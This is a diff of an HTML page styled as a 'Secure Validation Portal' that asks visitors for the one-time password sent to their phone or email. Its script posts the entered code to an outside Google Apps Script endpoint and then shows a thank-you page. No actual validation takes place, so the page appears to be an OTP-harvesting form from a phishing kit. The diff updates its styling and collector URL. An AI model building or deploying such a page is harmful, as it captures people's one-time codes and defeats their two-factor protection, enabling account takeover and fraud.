@@ -1,114 +1,147 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>OTP Validation</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    background: linear-gradient(to bottom, #08143a, #0b1d4d);
-    color: #fff;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    min-height: 100vh;
-  }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Validation OTP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: linear-gradient(to bottom, #08143a, #0b1d4d);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #fff;
+      overflow-x: hidden;
+    }
 
-  .header {
-    background: linear-gradient(135deg, #08143a, #0b1d4d);
-    width: 100%;
-    text-align: center;
-    padding: 40px 20px;
-    border-bottom-left-radius: 40px;
-    border-bottom-right-radius: 40px;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-  }
-  .header h1 { margin: 0; font-size: 24px; }
-  .header p { margin: 8px 0 0; font-size: 14px; }
+    .header {
+      background: linear-gradient(135deg, #08143a, #0b1d4d);
+      color: #fff;
+      width: 100%;
+      min-height: 150px;
+      padding: 40px 20px;
+      border-bottom-left-radius: 40px;
+      border-bottom-right-radius: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
 
-  .login-container {
-    background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
-    width: 90%;
-    max-width: 400px;
-    margin-top: -30px;
-    padding: 30px 25px;
-    border-radius: 12px;
-    box-shadow: 0 6px 16px rgba(0,0,0,0.4);
-    text-align: center;
-  }
+    .header h2 {
+      margin: 0 0 10px;
+      font-size: 22px;
+    }
 
-  .login-container label { display: block; margin-bottom: 6px; font-size: 14px; color: #fff; }
-  .login-container input {
-    width: 100%; padding: 12px; margin-bottom: 16px;
-    border: 1px solid #274080; border-radius: 6px; font-size: 14px;
-    background-color: rgba(11,29,77,0.9); color: #fff;
-    transition: all 0.3s ease;
-  }
-  .login-container input:focus {
-    border-color: #1e90ff;
-    box-shadow: 0 0 8px rgba(30,144,255,0.6);
-    outline: none;
-  }
+    .header p {
+      margin: 5px 0 0;
+      font-size: 14px;
+    }
 
-  .btn {
-    width: 100%;
-    padding: 14px;
-    border: none;
-    border-radius: 6px;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-    background: linear-gradient(135deg, #1e90ff, #187bcd);
-    color: #fff;
-    transition: all 0.3s ease, transform 0.2s ease;
-  }
-  .btn:hover {
-    background: linear-gradient(135deg, #187bcd, #1560a3);
-    transform: scale(1.02);
-    box-shadow: 0 4px 12px rgba(0,0,0,0.4);
-  }
-</style>
+    .login-container {
+      background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
+      color: #fff;
+      width: 90%;
+      max-width: 360px;
+      margin-top: -30px;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      backdrop-filter: blur(4px);
+    }
+
+    .login-container label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #fff;
+    }
+
+    .login-container input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #274080;
+      border-radius: 6px;
+      font-size: 14px;
+      background-color: rgba(11,29,77,0.9);
+      color: #fff;
+    }
+
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .button-group button {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #1e90ff, #187bcd);
+      color: #fff;
+      transition: all 0.3s ease;
+    }
+
+    .button-group button:hover {
+      background: linear-gradient(135deg, #187bcd, #1560a3);
+      transform: scale(1.05);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+  </style>
 </head>
 <body>
+  <div class="header">
+    <div>
+      <h2>Secure Validation Portal</h2>
+      <p>Enter the OTP sent to your phone or email</p>
+    </div>
+  </div>
 
-<div class="header">
-  <h1>Validation OTP</h1>
-  <p>Enter your OTP to continue</p>
-</div>
+  <div class="login-container">
+    <form id="otpForm">
+      <label>OTP Code</label>
+      <input type="text" name="otp" placeholder="Enter your OTP" required>
 
-<div class="login-container">
-  <form id="otpForm">
-    <label>Validation OTP</label>
-    <input type="text" name="validation_otp" placeholder="Enter your OTP" required>
-    <button type="submit" class="btn">VALIDATE →</button>
-  </form>
-</div>
+      <div class="button-group">
+        <button type="submit">VALIDATE OTP →</button>
+      </div>
+    </form>
+  </div>
 
-<script>
-const scriptURL = "https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec";
-const form = document.getElementById("otpForm");
+  <script>
+    const otpForm = document.getElementById("otpForm");
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxBZeRKxbAyf1pWTLN0z15_l-E3RXnp3hvx2gYHiDDU00GKZ3vBKVt7T2kImh9Sfoo1dw/exec";
 
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
-  const formData = new FormData(form);
+    otpForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const formData = new FormData(otpForm);
 
-  try {
-    const response = await fetch(scriptURL, { method: "POST", body: formData });
-    const result = await response.text();
-    console.log("Server response:", result);
+      try {
+        const response = await fetch(scriptURL, { method: "POST", body: formData });
+        const result = await response.json(); // expects JSON with {"result":"success"}
 
-    if (result.includes("success")) {
-      window.location.href = "thankyou.html";
-    } else {
-      alert("Submission failed: " + result);
-    }
-  } catch (err) {
-    console.error("Error:", err);
-    alert("There was a network error. Please try again.");
-  }
-});
-</script>
+        if (result.result === "success") {
+          window.location.href = "thankyou.html";
+        } else {
+          alert("Invalid OTP, please try again.");
+        }
+      } catch (err) {
+        console.error("Error:", err);
+        alert("Network error. Please try again.");
+      }
+    });
+  </script>
 </body>
 </html>
